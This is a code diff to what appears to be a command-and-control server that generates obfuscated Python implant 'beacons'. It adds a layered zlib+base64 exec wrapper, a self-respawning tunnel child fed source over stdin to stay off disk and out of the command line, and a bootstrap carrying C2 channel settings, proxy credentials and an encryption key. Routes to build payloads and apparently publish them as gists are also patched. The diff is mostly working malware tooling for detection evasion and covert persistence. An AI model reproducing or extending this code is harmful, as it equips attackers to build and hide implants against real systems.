@@ -262,6 +262,43 @@ def _proxy_config_from_body(body: dict) -> dict:
     }
 
 
+def _obfuscate_layer(code: str, var_mod: str) -> str:
+    """One zlib + base64 layer around `code`, keeping what it decompressed.
+
+    Written once and called from both generator routes. It used to be a
+    closure defined separately inside each of them, and the day the two
+    had to change together is the day this repository would have paid for
+    the duplication again -- `_beacon_config_block` already had to be
+    hoisted out of them for the same reason.
+
+    The emitted line binds the decompressed text to the module global
+    `_src` before executing it, instead of handing it straight to `exec`.
+    That is what lets a running artifact start a second mode of itself:
+    under `python3 -c` there is no file to re-run and `sys.argv[0]` is the
+    literal string "-c", so the only copy of the source is the one the
+    process is holding. `Beacon._exec_tunnel` writes it to a
+    `python3 -` child on stdin, which keeps the payload off the child's
+    command line and off the disk.
+
+    `globals()["_src"]` rather than a plain assignment: the artifact is
+    normally exec'd at module level, where the two are the same, but an
+    embedder that execs it from inside a function would bind a local and
+    throw the source away without a word. The read in `exec(_src)` is an
+    ordinary global load, which works either way.
+
+    With several layers each one binds `_src` in turn and the innermost
+    wins, because the innermost is the only one whose decompressed text is
+    the real source rather than the next wrapper.
+    """
+    import zlib
+
+    compressed = zlib.compress(code.encode("utf-8"), 9)
+    encoded = base64.b64encode(compressed).decode()
+    return ('import base64 as %s,zlib;'
+            'globals()["_src"]=zlib.decompress(%s.b64decode("%s"));'
+            'exec(_src)' % (var_mod, var_mod, encoded))
+
+
 def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
                          enc_key: str) -> str:
     """Render the __main__ bootstrap appended to a generated beacon.
@@ -269,6 +306,12 @@ def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
     The config travels as a base64 JSON blob rather than inline literals:
     credentials such as "CORP\\user" contain backslashes and profiles contain
     JSON booleans, both of which corrupt a quoted-literal embedding.
+
+    Two names are read out of the beacon source this block is appended to
+    rather than repeated here -- `_TUNNEL_MODE_ENV` and `TunnelEndpoint`.
+    The environment variable in particular is a fact the parent and the
+    child have to agree on exactly, and the two are the same file, so
+    there is no reason for the string to exist twice.
     """
     import textwrap
 
@@ -276,18 +319,28 @@ def _beacon_config_block(gen_cfg: dict, interval: int, jitter: int,
         json.dumps(gen_cfg).encode("utf-8")).decode("ascii")
     return textwrap.dedent(f"""\
     if __name__=="__main__":
-        import base64 as _b64,json as _j
+        import base64 as _b64,json as _j,os as _os
         _p=_j.loads(_b64.b64decode("{cfg_b64}").decode("utf-8"))
         _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
         "https":_p["https"],"dns":_p["dns"],"smb":_p["smb"],"quic":_p["quic"],
         "encryption_key":"{enc_key}",
         "proxy":_p["proxy"],
         "c2_profile":_p["c2_profile"]}}}}
-        b=Beacon(_cfg);b.start()
-        try:
-            import time
-            while True: time.sleep(60)
-        except KeyboardInterrupt: b.stop()
+        _t=_p.get("tunnel")
+        if _t: _cfg["c2"]["tunnel"]=_t
+        if _os.environ.get(_TUNNEL_MODE_ENV):
+            if not _t: raise SystemExit(
+                _TUNNEL_MODE_ENV+" is set, so this process is the tunnel "
+                "child, but the build it came from carries no c2.tunnel "
+                "block: there is no server, port, public_key or psk to dial "
+                "with. Generate the build with the tunnel enabled.")
+            TunnelEndpoint(_cfg).run()
+        else:
+            b=Beacon(_cfg);b.start()
+            try:
+                import time
+                while True: time.sleep(60)
+            except KeyboardInterrupt: b.stop()
     """)
 
 
@@ -1106,7 +1159,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
     @app.route("/api/server/beacon-gen", methods=["POST"])
     @require_auth
     def api_beacon_gen():
-        import zlib, random as _r, string
+        import random as _r, string
         body = request.get_json(silent=True) or {}
         c2_url = body.get("c2_url", "").strip()
         enc_key = body.get("enc_key", "").strip()
@@ -1153,18 +1206,11 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         def _rand_name(n=12):
             return "_" + "".join(_r.choices(string.ascii_lowercase, k=n))
 
-        def _obfuscate_layer(code, layer_num):
-            compressed = zlib.compress(code.encode("utf-8"), 9)
-            encoded = base64.b64encode(compressed).decode()
-            var_data = _rand_name()
-            var_mod = _rand_name()
-            return f'import base64 as {var_mod},zlib;exec(zlib.decompress({var_mod}.b64decode("{encoded}")))'
-
         deob_layers = [{"layer": 0, "label": "Original source", "size": len(payload),
                         "preview": payload[:2000]}]
         stage = payload
         for i in range(layers):
-            stage = _obfuscate_layer(stage, i)
+            stage = _obfuscate_layer(stage, _rand_name())
             deob_layers.append({
                 "layer": i + 1,
                 "label": f"Layer {i + 1}: zlib + base64 + randomized alias",
@@ -1191,7 +1237,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
     @app.route("/api/server/beacon-gist", methods=["POST"])
     @require_auth
     def api_beacon_gist():
-        import zlib, random as _r, string
+        import random as _r, string
 
         try:
             check = subprocess.run(["gh", "auth", "status"], capture_output=True, text=True, timeout=10)
@@ -1247,15 +1293,9 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         def _rand_name(n=12):
             return "_" + "".join(_r.choices(string.ascii_lowercase, k=n))
 
-        def _obfuscate_layer(code):
-            compressed = zlib.compress(code.encode("utf-8"), 9)
-            encoded = base64.b64encode(compressed).decode()
-            var_mod = _rand_name()
-            return f'import base64 as {var_mod},zlib;exec(zlib.decompress({var_mod}.b64decode("{encoded}")))'
-
         stage = payload
         for _ in range(layers):
-            stage = _obfuscate_layer(stage)
+            stage = _obfuscate_layer(stage, _rand_name())
 
         import tempfile
         tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False, encoding="utf-8")
